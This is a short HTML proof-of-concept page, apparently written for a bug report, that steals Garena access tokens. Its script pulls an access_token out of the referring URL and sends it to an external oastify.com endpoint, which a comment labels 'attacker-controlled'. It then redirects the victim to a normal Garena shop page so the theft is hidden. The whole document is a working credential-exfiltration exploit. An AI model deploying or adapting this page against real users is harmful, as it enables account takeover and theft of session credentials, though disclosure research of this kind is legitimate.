<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Garena Token Leak POC</title>
</head>
<body>
  <h2>Loading...</h2>

  <script>
    // Read referrer and try to extract access_token
    const ref = document.referrer;
    if (ref.includes("access_token=")) {
      const token = ref.split("access_token=")[1].split(/[&#]/)[0];

      // Leak to attacker-controlled endpoint
      fetch("https://q2tjnk8qcrqlhk0poo6mxiktikocc30s.oastify.com/leak?token=" + encodeURIComponent(token));
    }

    // Optional: Redirect victim back to a normal page after few seconds
    setTimeout(() => {
      window.location.href = "https://shop.garena.sg/?utm_source=FF+RedeemPage&utm_medium=Entrance";
    }, 2000);
  </script>
</body>
</html>
